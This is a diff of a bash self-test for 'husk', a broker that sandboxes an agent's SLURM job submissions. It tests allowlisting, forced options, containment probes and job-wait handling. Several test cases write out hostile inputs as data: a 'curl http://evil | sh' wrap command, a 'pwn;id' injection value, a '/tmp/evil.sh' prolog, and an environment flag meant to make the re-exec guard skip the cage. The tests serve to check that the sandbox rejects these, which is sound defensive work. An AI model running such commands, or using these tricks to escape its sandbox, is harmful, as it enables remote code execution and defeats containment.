+# ...and a garbage scancel argument is still refused, as a parse failure this time.
+reset_spool
+mkreq p9 scancel '["x"]' "$PWORK" ""
+run_broker dry "$SPOOL/out.p9"
+expect_rejection_because p9 'is not a job id' scancel.not_an_id "a scancel argument that is not a job id is refused"
 
 # P10 — an unsupported protocol version is rejected before any tool dispatch.
 reset_spool
-mkreq p10 sbatch "[\"--partition=$PART\"]" /work "$VALID_BODY" 999
+mkreq p10 sbatch "[\"--partition=$PART\"]" "$PWORK" "$VALID_BODY" 999
 run_broker dry "$SPOOL/out.p10"
-expect_status p10 rejected proto.version "unsupported protocol version rejected"
+expect_rejection_because p10 'protocol version' proto.version "unsupported protocol version rejected"
 
 # ---- allowlist / re-emit (the v0.4 redesign): broker BUILDS the invocation --------
 # The submission surface is default-DENY: options are an allowlist, not a strip-list.
@@ -274,25 +626,50 @@ expect_status p10 rejected proto.version "unsupported protocol version rejected"
 
 # P11 — an option NOT on the allowlist is rejected outright (not passed through).
 reset_spool
-mkreq p11 sbatch "[\"--partition=$PART\",\"--get-user-env\"]" /work "$VALID_BODY"
+mkreq p11 sbatch "[\"--partition=$PART\",\"--get-user-env\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p11"
-expect_status p11 rejected sbatch.unknown_option "unsupported CLI option rejected (allowlist)"
+expect_rejection_because p11 '--get-user-env' sbatch.unknown_option "unsupported CLI option rejected (allowlist)"
+
+# P11b — multi-node is REJECTED, not silently downgraded to one node. The cage profile is
+# single-node (multi-node needs an IP path for the PMI bootstrap), and a job that asked
+# for 4 nodes but ran on 1 would report success having used a quarter of the resources.
+reset_spool
+mkreq p11b sbatch "[\"--partition=$PART\",\"--nodes=4\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p11b"
+expect_rejection_because p11b 'single-node|--nodes=4' sbatch.multinode "multi-node rejected (single-node cage profile)"
+
+# P11c — and the topology is FORCED, not merely permitted: --nodes=1 is emitted even when
+# the agent never mentioned it, so the scheduler cannot spread --ntasks over nodes and
+# leave the job wearing a single-node cage on a multi-node allocation.
+reset_spool
+mkreq p11c sbatch "[\"--partition=$PART\",\"--ntasks=8\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p11c"
+# Match the `argv:` line ONLY. The probe body carries its own `#SBATCH --nodes=1`, so a
+# whole-file grep passes even against a broker that forces nothing — it was a false
+# positive on the first try. The forced value has to appear on the real command line,
+# because that is what outranks the directive.
+if grep -E '^argv:' "$SPOOL/out.p11c" 2>/dev/null | grep -q -- '--nodes=1'; then
+  check PASS policy sbatch.nodes_forced "--nodes=1 forced onto the argv of a submission that never asked"
+else
+  check FAIL policy sbatch.nodes_forced "--nodes=1 NOT on the forced argv — profile is inferred, not guaranteed"
+fi
 
 # P12 — a benign option carrying an out-of-grammar / injection VALUE is rejected.
 # (';' is a shell metacharacter; harmless here — literal inside the JSON string.)
 reset_spool
-mkreq p12 sbatch "[\"--partition=$PART\",\"--job-name=pwn;id\"]" /work "$VALID_BODY"
+mkreq p12 sbatch "[\"--partition=$PART\",\"--job-name=pwn;id\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p12"
-expect_status p12 rejected sbatch.bad_value "out-of-grammar option value rejected"
+expect_rejection_because p12 '--job-name' sbatch.bad_value "out-of-grammar option value rejected"
 
-# P13 — benign resource options are validated + RE-EMITTED canonically (glued -N2,
-# separated -c 4, and =-form all normalise to --long=value).
+# P13 — benign resource options are validated + RE-EMITTED canonically (glued -J, ""
+# separated -c 4, and =-form all normalise to --long=value). NB not -N: the cage profile
+# owns the topology, so --nodes is Forced and never a passthrough.
 reset_spool
-mkreq p13 sbatch "[\"--partition=$PART\",\"-N2\",\"-c\",\"4\",\"--time=01:00:00\"]" /work "$VALID_BODY"
+mkreq p13 sbatch "[\"--partition=$PART\",\"-Jrun1\",\"-c\",\"4\",\"--time=01:00:00\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p13"
 ARGV13="$(grep -m1 '^argv:' "$SPOOL/out.p13" || true)"
 p13_ok=1; p13_why=""
-grep -q 'nodes=2'         <<<"$ARGV13" || { p13_ok=0; p13_why+="no canonical --nodes; "; }
+grep -q 'job-name=run1'   <<<"$ARGV13" || { p13_ok=0; p13_why+="no canonical --job-name; "; }
 grep -q 'cpus-per-task=4' <<<"$ARGV13" || { p13_ok=0; p13_why+="no canonical --cpus-per-task; "; }
 grep -q 'time=01:00:00'   <<<"$ARGV13" || { p13_ok=0; p13_why+="no --time; "; }
 if [ "$p13_ok" = 1 ]; then check PASS policy sbatch.canonicalize "resource opts validated + re-emitted canonically"
@@ -301,13 +678,20 @@ else check FAIL policy sbatch.canonicalize "${p13_why%; }"; fi
 # P14 — --wrap must NOT survive into the forced argv (F27: real sbatch would build the
 # job FROM the wrap string and skip the injected re-exec guard → uncaged execution).
 reset_spool
-mkreq p14 sbatch "[\"--partition=$PART\",\"--wrap=curl http://evil | sh\"]" /work "$VALID_BODY"
+mkreq p14 sbatch "[\"--partition=$PART\",\"--wrap=curl http://evil | sh\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p14"
 ARGV14="$(grep -m1 '^argv:' "$SPOOL/out.p14" || true)"
-if grep -q -- '--wrap' <<<"$ARGV14" || grep -q 'evil' <<<"$ARGV14"; then
+# AN EMPTY HAYSTACK IS NOT EVIDENCE. Both greps below are ABSENCE assertions, and a broker
+# that rejected the request emits no `argv:` line at all — so `ARGV14` is empty, both greps
+# miss, and the arm passes on nothing. Measured directly (`D1`: `argv:` lines = 0 under a
+# blanket-reject mutation, vs 1 unmutated). This arm is a false friend in EVERY direction
+# until an absence has a presence to be an absence OF.
+if ! grep -q '"sbatch"' <<<"$ARGV14"; then
+  check FAIL policy sbatch.wrap_stripped "no forced argv to inspect (the broker emitted no 'argv:' line) - an absent --wrap here proves nothing; see the other sbatch arms for why the submission did not get that far"
+elif grep -q -- '--wrap' <<<"$ARGV14" || grep -q 'evil' <<<"$ARGV14"; then
   check FAIL policy sbatch.wrap_stripped "--wrap leaked into forced argv (F27): $ARGV14"
 else
-  check PASS policy sbatch.wrap_stripped "--wrap stripped from forced argv (runs via the guarded staged script)"
+  check PASS policy sbatch.wrap_stripped "--wrap stripped from a forced argv that was actually built (runs via the guarded staged script)"
 fi
 
 # P15 — a body `#SBATCH --output` (as every real run script has, e.g. ICON) is ACCEPTED,
@@ -320,16 +704,39 @@ BODY_OUT="#!/bin/bash
 #SBATCH --chdir=/
 echo hi
 "
-mkreq p15 sbatch '[]' /work "$BODY_OUT"
+mkreq p15 sbatch '[]' "$PWORK" "$BODY_OUT"
 run_broker dry "$SPOOL/out.p15"
-ARGV15="$(grep -m1 '^argv:' "$SPOOL/out.p15" || true)"
-p15_ok=1; p15_why=""
-[ "$(respfield p15 status)" = submitted ] || { p15_ok=0; p15_why+="not submitted ($(respfield p15 message)); "; }
-grep -q '.bashrc'                   <<<"$ARGV15" && { p15_ok=0; p15_why+="body --output leaked; "; }
-grep -q 'output=/work/slurm-%j.out' <<<"$ARGV15" || { p15_ok=0; p15_why+="no forced --output; "; }
-grep -q 'chdir=/work'               <<<"$ARGV15" || { p15_ok=0; p15_why+="no forced --chdir; "; }
-if [ "$p15_ok" = 1 ]; then check PASS policy sbatch.body_forced "body --output/--chdir accepted but dominated by the forced CLI values"
-else check FAIL policy sbatch.body_forced "${p15_why%; }"; fi
+p15_st="$(respfield p15 status)"; p15_msg="$(respfield p15 message)"
+if [ "$p15_st" != rejected ]; then
+  check FAIL policy sbatch.body_confined "status=$p15_st - a #SBATCH directive reached an uncaged write path"
+elif printf '%s' "$p15_msg" | grep -qiE -- '--chdir|--output'; then
+  check PASS policy sbatch.body_confined "a body --output into a home / --chdir=/ is refused by the confinement: ${p15_msg:0:60}"
+else
+  check FAIL policy sbatch.body_confined "refused, but not by the --chdir/--output confinement: \"${p15_msg:0:90}\""
+fi
+
+# ...and the ICON shape must be ACCEPTED, with the script's own log path preserved. This
+# is the other half of the same rule: confinement exists so real run scripts work, not to
+# forbid them. A check that only proved refusals would pass on a broker that refused
+# everything.
+reset_spool
+mkdir -p "$PWORK/run"
+BODY_ICON="#!/bin/bash
+#SBATCH --partition=$PART
+#SBATCH --job-name=exp.mch_icon-ch1_small.run
+#SBATCH --chdir=$PWORK/./run
+#SBATCH --output=$PWORK/./run/LOG.exp.mch_icon-ch1_small.run.%j.o
+echo hi
+"
+mkreq p15b sbatch '[]' "$PWORK" "$BODY_ICON"
+run_broker dry "$SPOOL/out.p15b"
+ARGV15B="$(grep -m1 '^argv:' "$SPOOL/out.p15b" || true)"
+p15b_ok=1; p15b_why=""
+[ "$(respfield p15b status)" = submitted ] || { p15b_ok=0; p15b_why+="not submitted ($(respfield p15b message)); "; }
+grep -q "chdir=$PWORK/run"  <<<"$ARGV15B" || { p15b_ok=0; p15b_why+="--chdir not honoured; "; }
+grep -q "run/LOG.exp.mch_icon-ch1_small.run.%j.o" <<<"$ARGV15B" || { p15b_ok=0; p15b_why+="log path not preserved; "; }
+if [ "$p15b_ok" = 1 ]; then check PASS policy sbatch.body_logpath "a run script keeps its own log path and workdir inside the tree"
+else check FAIL policy sbatch.body_logpath "${p15b_why%; }"; fi
 
 # P16 — F24: a body `#SBATCH --export=ALL,_HUSK_RESANDBOXED=1` would make the re-exec
 # guard skip the cage. Accepted (real scripts set --export), neutralised by the forced
@@ -340,7 +747,7 @@ BODY_EXP="#!/bin/bash
 #SBATCH --export=ALL,_HUSK_RESANDBOXED=1
 echo hi
 "
-mkreq p16 sbatch '[]' /work "$BODY_EXP"
+mkreq p16 sbatch '[]' "$PWORK" "$BODY_EXP"
 run_broker dry "$SPOOL/out.p16"
 ARGV16="$(grep -m1 '^argv:' "$SPOOL/out.p16" || true)"
 if [ "$(respfield p16 status)" = submitted ] \
@@ -358,9 +765,9 @@ BODY_UNK="#!/bin/bash
 #SBATCH --prolog=/tmp/evil.sh
 echo hi
 "
-mkreq p17 sbatch '[]' /work "$BODY_UNK"
+mkreq p17 sbatch '[]' "$PWORK" "$BODY_UNK"
 run_broker dry "$SPOOL/out.p17"
-expect_status p17 rejected sbatch.body_unknown "unknown #SBATCH directive rejected"
+expect_rejection_because p17 '--prolog' sbatch.body_unknown "unknown #SBATCH directive rejected"
 
 # P18 — burst-buffer / DataWarp directives (#BB/#DW) are rejected.
 reset_spool
@@ -369,15 +776,247 @@ BODY_BB="#!/bin/bash
 #BB stage_in source=/foo destination=/bar
 echo hi
 "
-mkreq p18 sbatch '[]' /work "$BODY_BB"
+mkreq p18 sbatch '[]' "$PWORK" "$BODY_BB"
 run_broker dry "$SPOOL/out.p18"
-expect_status p18 rejected sbatch.body_burstbuffer "#BB/#DW burst-buffer directive rejected"
+expect_rejection_because p18 'burst-buffer|#BB|#DW' sbatch.body_burstbuffer "#BB/#DW burst-buffer directive rejected"
 
 # Submit ONE fixed probe THROUGH the broker (live), wait for it, and re-record the
 # RESULT/FP lines from its SLURM output back through the driver's tally. Launch +
 # verdict stay external (trusted); only the observation runs inside the cage. The
 # probe body must bracket its lines with ===HUSK-PROBE-BEGIN===/===HUSK-PROBE-END===.
 # args: reqid argv_json workdir body [source]
+# Block until a job leaves the queue. This is the main timeout; the node-pinned follow-up
+# in the containment tier keeps its own much shorter one on purpose.
+#
+# Three outcomes, because they have three different owners and the caller must not merge
+# them:
+#   0  reached a terminal state     - measure it
+#   1  still PENDING                - never started; the cluster's business, not husk's
+#   2  RUNNING/COMPLETING/SUSPENDED - husk's job started and did not finish. That is a hung
+#                                     cage (a Lustre metadata stall, a wedged bwrap, a relay
+#                                     that never returns) and IS husk's business
+#
+# Collapsing 1 and 2 into "did not run" was the first version of this fix and it was wrong:
+# it filed a hung cage as nothing-to-see. Collapsing 1 into 0 is the shipped bug it replaces
+# - Santis 2026-09-01, two probe jobs sat PENDING and took 26 downstream arms with them
+# while the report said FAIL, as if husk had been measured and found wanting.
+JOB_WAIT_SECONDS=300
+wait_for_job() {
+  local _ st
+  for _ in $(seq 1 $((JOB_WAIT_SECONDS / 2))); do
+    squeue -h -j "$1" 2>/dev/null | grep -q . || { sleep 1; return 0; }  # sleep: flush output
+    sleep 2
+  done
+  # -o '%T' and not a column of the default output: sites set SQUEUE_FORMAT, and an awk
+  # positional read would then be reading whatever column that happens to put fifth.
+  st="$(squeue -h -j "$1" -o '%T' 2>/dev/null | head -1)"
+  case "$st" in
+    PENDING) return 1 ;;
+    ?*)      return 2 ;;
+  esac
+  # No state came back. Either the job left the queue during the final poll, or this SLURM
+  # would not answer -o. Ask again without a format before deciding, because the two have
+  # opposite consequences and guessing wrong is silent either way: gone -> measure the
+  # output; still there but unreadable -> 2, the loud branch. An unknown state must not be
+  # the quiet one.
+  squeue -h -j "$1" 2>/dev/null | grep -q . && return 2
+  sleep 1; return 0
+}
+
+# Why SLURM is holding a job, for a message that diagnoses itself. Resources/Priority is a
+# busy cluster and says nothing about husk; PartitionConfig/BadConstraints/QOSMax* means the
+# broker forced a --partition/--account/--nodes/--time combination this cluster will never
+# schedule - a husk defect that presents as a queued job. Naming the reason is what lets an
+# operator tell those apart.
+queue_reason() {
+  local r
+  r="$(squeue -h -j "$1" -o '%T/%r' 2>/dev/null | head -1)"
+  # squeue forgets a job the moment it leaves the queue, and -o is not guaranteed on an
+  # older SLURM. Fall back to the accounting DB using the SAME invocation the probe arm's
+  # hint already relies on - a SKIP naming no state at all diagnoses nothing.
+  [ -z "$r" ] && r="$(sacct -j "$1" -X -n -P -o State,ExitCode 2>/dev/null | head -1 | tr '|' '/')"
+  [ -n "$r" ] && printf ' [%s]' "$r"
+  return 0   # its value is a STRING; a nonzero rc here would be a trap for the next caller
+}
+
+# The arm ids a probe body would have emitted, read OUT OF THE BODY rather than re-typed
+# here (P8). When the job never runs those arms do not fail - they vanish, leaving only the
+# `arms=` total to notice them by, and that total's green baseline differs per cluster so
+# nobody can diff it by eye. One SKIP each keeps every id in the report and in the SKIPPED
+# list, where a reader can see WHICH claim went unmeasured.
+probe_arm_ids() {
+  printf '%s\n' "$1" \
+    | sed -n 's/.*RESULT [A-Z][A-Z]* \([a-z][a-z]*\) \([a-zA-Z_][a-zA-Z_.0-9]*\).*/\1 \2/p' \
+    | sort -u
+}
+
+# Submit srun-probe.sh THROUGH the broker and translate its verdicts.
+#
+# It SHELLS OUT to the real script rather than reimplementing its checks. That script is
+# the one a human runs by hand when the step pair misbehaves, so a copy here would be a
+# second thing to keep in step with the step-broker - and the copy that drifts is the one
+# that reports green while the real path is broken.
+#
+# The translation is deliberately narrow: only lines the script marks `[expect]` count as
+# PASS. Its own comments explain why several of those checks would otherwise pass with no
+# husk in the path at all (the real srun also fails on a missing --task-prolog), so a
+# looser mapping here would throw away the discrimination the script was written to have.
+run_srun_probe() {
+  local work="$1" script="$HERE/srun-probe.sh"
+  if [ ! -r "$script" ]; then
+    check SKIP containment steps.probe "srun-probe.sh not found beside selftest.sh"
+    return
+  fi
+  reset_spool
+  mkreq srunprobe sbatch "[\"--partition=$PART\"]" "$work" "$(cat "$script")" 1 file
+  run_broker live "$SPOOL/out.srunprobe" "$work"
+  local st jid; st="$(respfield srunprobe status)"; jid="$(respfield srunprobe job_id)"
+  if [ "$st" != submitted ]; then
+    check FAIL containment steps.submit "broker did not submit srun-probe: status=$st msg=$(respfield srunprobe message)"
+    return
+  fi
+  check PASS containment steps.submit "srun-probe submitted; job_id=$jid"
+  echo "   waiting for srun-probe job $jid ..."
+  local queued=0; wait_for_job "$jid" || queued=$?
+  local qr=""; [ "$queued" != 0 ] && qr="$(queue_reason "$jid")"
+  # The same self-diagnosing hint the other live arm carries. Without it this arm could
+  # print "never started" and nothing else, about a machine the reader cannot log into.
+  local sacct_hint=""; sacct_hint="$(sacct -j "$jid" -X -n -P -o State,ExitCode 2>/dev/null | head -1)"
+  [ -n "$sacct_hint" ] && sacct_hint=" [$sacct_hint]"
+  [ "$queued" != 0 ] && scancel "$jid" >/dev/null 2>&1
+  if [ "$queued" = 1 ]; then
+    check SKIP containment steps.output \
+      "srun-probe job $jid never started within ${JOB_WAIT_SECONDS}s - cancelled; this arm did not measure$qr$sacct_hint"
+    UNMEASURED=$((UNMEASURED+1))
+    return
+  fi
+  if [ "$queued" = 2 ]; then
+    check FAIL containment steps.output \
+      "srun-probe job $jid STARTED and had not finished after ${JOB_WAIT_SECONDS}s - cancelled; a step that never returns is husk's$qr$sacct_hint"
+    return
+  fi
+  local out="$work/slurm-$jid.out"
+  if [ ! -f "$out" ]; then
+    check FAIL containment steps.output "no output at $out from the srun-probe job (it reached a terminal state and wrote nothing)$sacct_hint"
+    return
+  fi
+  local line seen=0
+  while IFS= read -r line; do
+    case "$line" in
+      "step : OK"*)   seen=1; check PASS containment steps.launch  "srun ran a step through the stub + step-broker" ;;
+      "step : FAILED"*) seen=1; check FAIL containment steps.launch "brokered srun could not launch a step" ;;
+      "cage : homes hidden"*) check PASS containment steps.cage    "ranks are sandboxed (homes hidden inside the step)" ;;
+      "cage : /users shows"*) check FAIL containment steps.cage    "a rank could see other homes - the per-task wrap is not applied" ;;
+      # Says only what it measured. This probe counts the processes a rank can SEE and
+      # concludes it is not in the host namespace. It does NOT check that two ranks share
+      # one namespace with each other - that is steps.pidns_peers, separately - and the
+      # old wording claimed both. When the peer arm failed, the two messages contradicted
+      # each other and cost a round of looking for a regression that was not there.
+      "pidns: ranks see only"*)   check PASS containment steps.pidns   "a rank sees only its own namespace, not the node (peer sharing is steps.pidns_peers)" ;;
+      "pidns: a rank sees "*)     check FAIL containment steps.pidns   "a rank is in the HOST pid namespace - it can see and signal the step-broker" ;;
+      "pidns: ranks can see each other"*) check PASS containment steps.pidns_peers "ranks can name each other - CMA/MPI has peers" ;;
+      "pidns: peers invisible"*)  check FAIL containment steps.pidns_peers "ranks are in SEPARATE pid namespaces - MPI cannot attach" ;;
+      "pidns: peer check inconclusive"*) check INFO containment steps.pidns_peers "the peer probe measured the wrong instant - inconclusive, NOT a breach" ;;
+      "pidns: could not"*)        check INFO containment steps.pidns   "pid-namespace check did not run" ;;
+      "rnet : a rank has socat and"*) check PASS functional  steps.egress  "a rank binds its own socat and its relay is listening" ;;
+      "rnet : a rank has NO socat"*)  check FAIL functional  steps.egress  "a rank has no socat in its cage - ranks run with no egress" ;;
+      "rnet : a rank has socat but"*) check FAIL functional  steps.egress  "a rank relay did not start - socat is there but nothing listens" ;;
+      "rnet : no egress configured"*) check SKIP functional  steps.egress  "no allowlist configured - rank egress not exercised" ;;
+      "rnet :"*)                      check INFO functional  steps.egress  "rank egress check inconclusive" ;;
+      "deny : --task-prolog refused"*) check PASS containment steps.allowlist "the step allowlist refused --task-prolog by husk's own message" ;;
+      "deny : --task-prolog ACCEPTED"*) check FAIL containment steps.allowlist "--task-prolog accepted - a step can run code outside the rank cage" ;;
+      "deny : --task-prolog failed, but NOT via husk"*) check FAIL containment steps.allowlist "the stub is not bound: that refusal came from the real srun, not husk" ;;
+      "rank2: OK"*)   check PASS containment steps.multirank "2 ranks in one step, both caged" ;;
+      "rank2:"*)      check FAIL containment steps.multirank "multi-rank step wrong: ${line#rank2: }" ;;
+      "shm  : OK"*)   check PASS functional  steps.shm       "ranks share /dev/shm (same-node MPI would hang otherwise)" ;;
+      "shm  :"*)      check FAIL functional  steps.shm       "ranks do not share /dev/shm: ${line#shm  : }" ;;
+      "env  : the script"*) check PASS functional steps.env  "a run script's exported variable reaches its ranks" ;;
+      "env  :"*)      check FAIL functional  steps.env       "run-script environment does not reach the ranks: ${line#env  : }" ;;
+    esac
+  done < "$out"
+  [ "$seen" = 1 ] || check FAIL containment steps.launch \
+    "srun-probe produced no step verdict - see $out and ${out%.out}.err"
+}
+
+# Does THIS site's slurmd honour a `#SBATCH` spelling husk's parser cannot see?
+#
+# husk gates directives with its own parser and then submits the body verbatim, so two
+# parsers read one file: husk's decides what is ALLOWED, slurmd's decides what is
+# HONOURED. For the Forced/dominated family that cannot matter (husk emits its own value
+# on the CLI and sbatch precedence is `command line > #SBATCH`); for options husk would
+# REJECT, a spelling it cannot see is an ungated channel. Which spellings those are is
+# site- and version-specific, so it is measured rather than assumed — same reasoning, and
+# the same shell-out shape, as the srun probe above.
+# The same question for the read-only verbs: does the real SLURM have the options husk
+# allows? husk's per-verb tables were written on a machine with no SLURM, so every entry is
+# a claim that could not be checked where it was made — and a typo is indistinguishable from
+# a correct entry until a user hits it. The probe reads the table FROM THE BROKER and runs
+# each option against the real binary. All of them return instantly and select nothing.
+run_query_parity_probe() {
+  local script="$HERE/query-parity-probe.sh"
+  if [ ! -x "$script" ]; then
+    check SKIP containment query.parity "query-parity-probe.sh not found beside selftest.sh"
+    return
+  fi
+  local out="$PWORK/query-parity.out"
+  # Clear HUSK_SLURM_SPOOL: with it set, squeue and friends are husk's own stub, and the
+  # probe would be asking husk whether husk agrees with itself.
+  ( unset HUSK_SLURM_SPOOL; "$script" "$BROKER" ) >"$out" 2>&1
+  local line
+  line=$(tail -1 "$out" 2>/dev/null)
+  # `parity: all N ...` was rendered PASS with no check that the instrument could go red
+  # here at all: the PASS condition is "no binary of that name printed a getopt complaint",
+  # which husk's OWN stub satisfies — measured, a full green against six stub-alikes
+  # (`B8-2`). The probe now sends a bogus canary per tool and reports
+  # `parity: instrument not measuring` when the tool does not complain about it, and names
+  # any tool it skipped instead of silently narrowing "all" to whatever was installed.
+  case "$line" in
+    "parity: instrument not measuring"*) check FAIL containment query.parity "${line#parity: } — a green run from this probe would not have been evidence; see $out" ;;
+    "parity: all "*)  check PASS containment query.parity "${line#parity: }" ;;
+    "parity: no SLURM"*) check SKIP containment query.parity "no SLURM on this host" ;;
+    "parity: nothing checked"*) check INFO containment query.parity "the broker printed no query table" ;;
+    *"do not exist"*) check FAIL containment query.parity "${line#parity: } — see $out" ;;
+    *) check INFO containment query.parity "unrecognised probe output: ${line:-<none>}" ;;
+  esac
+  # A tool husk allows options for and that is not installed here is not a failure, but it
+  # IS a hole in what "all N options exist" covered, and the old wording hid it.
+  local _skipped
+  _skipped="$(grep -m1 '^parity: not checked' "$out" 2>/dev/null || true)"
+  [ -n "$_skipped" ] && check INFO containment query.parity_scope "${_skipped#parity: }"
+}
+
+run_directive_parity_probe() {
+  local script="$HERE/directive-parity-probe.sh"
+  if [ ! -x "$script" ]; then
+    check SKIP containment sbatch.directive_parity "directive-parity-probe.sh not found beside selftest.sh"
+    return
+  fi
+  local out="$PWORK/directive-parity.out" rc=0
+  # It submits HELD jobs and cancels them, so it consumes no allocation. It refuses to run
+  # with HUSK_SLURM_SPOOL set (there sbatch is husk's stub, and it would measure the wrong
+  # parser), which is exactly the state the policy tier leaves behind — so clear it.
+  ( unset HUSK_SLURM_SPOOL; "$script" --partition "$PART" ) >"$out" 2>&1 || rc=$?
+  # THE COUNT AND THE VOCABULARY WERE BOTH WRONG. This grepped for `DIVERGES`, a token no
+  # producer anywhere emits — one hit in the whole tree and it was this line — so the FAIL
+  # detail always read "0" and then, because `grep -c` prints 0 AND exits 1, a second line
+  # reading "?" (`B8-3`). The producer's verdicts are BLIND and EAGER, and they are opposite
+  # findings: BLIND is husk silently dropping a directive the author expected, EAGER is husk
+  # re-emitting a line this site's Slurm would have ignored. Both texts here named only the
+  # BLIND half, so an EAGER finding was reported in the vocabulary of its opposite.
+  #
+  # Exit 3 is the probe's new "I did not measure anything" code (`B8-1`): it used to print
+  # agreement and exit 0 having submitted nothing, and this line rendered that as PASS.
+  local _blind _eager
+  _blind=$(grep -cE '^[^ ]+ +[^ ]+ +[^ ]+ +BLIND' "$out" 2>/dev/null || true); _blind=${_blind:-0}
+  _eager=$(grep -cE '^[^ ]+ +[^ ]+ +[^ ]+ +EAGER' "$out" 2>/dev/null || true); _eager=${_eager:-0}
+  case "$rc" in
+    0) check PASS containment sbatch.directive_parity "$(grep -c ' honoured \| ignored ' "$out" 2>/dev/null || echo 0) spelling(s) measured against this site's slurmd; husk's parser agrees with all of them" ;;
+    3) check SKIP containment sbatch.directive_parity "the probe could not measure anything (control did not come back honoured, or every variant was refused) — its verdict is not evidence; see $out" ;;
+    2) check SKIP containment sbatch.directive_parity "the probe declined to run (no partition, or HUSK_SLURM_SPOOL set) — see $out" ;;
+    *) check FAIL containment sbatch.directive_parity "$_blind BLIND (slurmd honours a spelling husk cannot see — husk drops it silently) + $_eager EAGER (husk re-emits a line slurmd would have ignored) — see $out" ;;
+  esac
+}
+
 run_live_probe() {
   local reqid="$1" argv="$2" work="$3" body="$4" src="${5:-file}"
   reset_spool
@@ -389,14 +1028,14 @@ run_live_probe() {
     return
   fi
   check PASS containment "$reqid.submit" "real sbatch accepted; job_id=$jid (proves MUNGE + controller + partition)"
+  # Remembered for the accumulation check, which needs a job that has FINISHED and the node
+  # it ran on, so a second job can be pinned there to look for what it left behind.
+  [ "$reqid" = probe ] && PROBE_JID="$jid"
   local out="$work/slurm-$jid.out"
   echo "   waiting for job $jid to finish (output: $out) ..."
-  local _
-  for _ in $(seq 1 150); do
-    squeue -h -j "$jid" 2>/dev/null | grep -q . || break
-    sleep 2
-  done
-  sleep 1  # let the final output flush
+  local queued=0; wait_for_job "$jid" || queued=$?
+  # Read the reason BEFORE cancelling, or the answer is always CANCELLED.
+  local qr=""; [ "$queued" != 0 ] && qr="$(queue_reason "$jid")"
   # Ask SLURM why, so a failure is self-diagnosing instead of a guess. Exit 127 from
   # the batch step means the guard's `seccomp-wrapper bwrap ...` was not found on the
   # compute node — i.e. husk is not installed there, or ~/.local/bin is not on the PATH
@@ -408,8 +1047,28 @@ run_live_probe() {
     ?*)        hint=" [$acct]" ;;
   esac
 
+  # A job we have stopped waiting on must not be left holding the queue: $WORK is its
+  # --chdir and --output target and this script deletes $WORK on the way out, so an
+  # abandoned job would later start against a directory that is gone.
+  [ "$queued" != 0 ] && scancel "$jid" >/dev/null 2>&1
+
+  if [ "$queued" = 1 ]; then
+    check SKIP containment "$reqid.output" \
+      "job $jid never started within ${JOB_WAIT_SECONDS}s - cancelled; this arm did not measure$qr$hint"
+    local _t _i
+    while read -r _t _i; do
+      [ -n "$_i" ] && check SKIP "$_t" "$_i" "not measured: probe job $jid never started"
+    done < <(probe_arm_ids "$body")
+    UNMEASURED=$((UNMEASURED+1))
+    return
+  fi
+  if [ "$queued" = 2 ]; then
+    check FAIL containment "$reqid.output" \
+      "job $jid STARTED and had not finished after ${JOB_WAIT_SECONDS}s - cancelled. A job that runs and never returns is a hung cage, which is husk's$qr$hint"
+    return
+  fi
   if [ ! -f "$out" ]; then
-    check FAIL containment "$reqid.output" "no job output at $out (job never ran, or --output not honoured)$hint"
+    check FAIL containment "$reqid.output" "no job output at $out (the job reached a terminal state; --output not honoured, or it died before writing)$hint"
     return
   fi
   local inblock=0 line _kw v t id rest
@@ -421,12 +1080,344 @@ run_live_probe() {
     [ "$inblock" = 1 ] || continue
     case "$line" in
       "RESULT "*) read -r _kw v t id rest <<<"$line"; check "$v" "$t" "$id" "$rest" ;;
-      "FP "*) FP_LINES+=("${line#FP }") ;;
+      "FP "*) FP_LINES+=("${line#FP }")
+              case "$line" in "FP host "*) PROBE_NODE="${line#FP host }" ;; esac ;;
     esac
   done < "$out"
-  grep -q 'HUSK-PROBE-END' "$out" || \
+  if ! grep -q 'HUSK-PROBE-END' "$out"; then
+    # Same distinction as the wait above, and the discriminant is already in $hint. A job
+    # the scheduler CUT SHORT - preempted (Balfrin's tests run on `preemptible`), wall-clock
+    # timeout, cancelled by an operator - writes partial output with no end marker. That is
+    # not evidence the cage failed to launch; it is no evidence at all.
+    case "$hint" in
+      *CANCELLED*|*TIMEOUT*|*PREEMPTED*|*NODE_FAIL*)
+        check SKIP containment "$reqid.output" "job was cut short before finishing, so its output is partial and this arm did not measure$hint — see $out"
+        UNMEASURED=$((UNMEASURED+1))
+        return ;;
+    esac
     check FAIL containment "$reqid.output" "job output has no probe end-marker (cage may have failed to launch)$hint — see $out"
+    # Carry the actual error into the report. When the cage fails to launch, the reason
+    # is in the job's output and NOWHERE else — a report that only names a path on a
+    # remote machine costs a round-trip to diagnose.
+    #
+    # BOTH streams. The broker forces --output AND --error, so a guard failure (a stale
+    # seccomp-wrapper, a bwrap bind error) lands in .err while .out stays empty — which
+    # made two consecutive bring-up runs report "no output" and explain nothing.
+    # Existence and size are printed too: `sed` on a missing file prints nothing, which
+    # is indistinguishable from an empty one.
+    for stream in "$out" "${out%.out}.err"; do
+      if [ -f "$stream" ]; then
+        echo "  --- $stream ($(wc -c <"$stream" 2>/dev/null) bytes) ---"
+        sed -n '1,15p' "$stream" 2>/dev/null | sed 's/^/  | /'
+      else
+        echo "  --- $stream: NO SUCH FILE (the job never started, or wrote elsewhere) ---"
+      fi
+    done
+    echo "  --- end ---"
+  fi
 }
+
+# ============================ LIFECYCLE TIER ===================================
+# The spool is a directory husk creates in someone's source tree, so what happens to
+# it when a session ENDS is part of the contract. It needs a real long-lived broker
+# (the policy tier's --once runs never reach the teardown path), but no scheduler.
+#
+# Why this is worth a test rather than a code read: a spool left behind is not merely
+# untidy. The field report of 2026-07-31 found two of them at different depths, and an
+# agent debugging a failed job opened the older, dead one and reasoned from a stale
+# project root. "Which of these is live?" must have an answer on disk.
+echo
+echo "== lifecycle tier (session spool ownership, teardown, reaping) =="
+LIFE="$PWORK/lifecycle"
+rm -rf "$LIFE"; mkdir -p "$LIFE"
+LIFE_SPOOL="$LIFE/.husk-slurm-spool-$$"
+mkdir -p "$LIFE_SPOOL"
+
+# Beside it: the three cases the reaper must tell apart.
+mkdir -p "$LIFE/.husk-slurm-spool"                  # pre-v0.5 layout, no owner file
+printf 'stale\n' > "$LIFE/.husk-slurm-spool/broker.log"
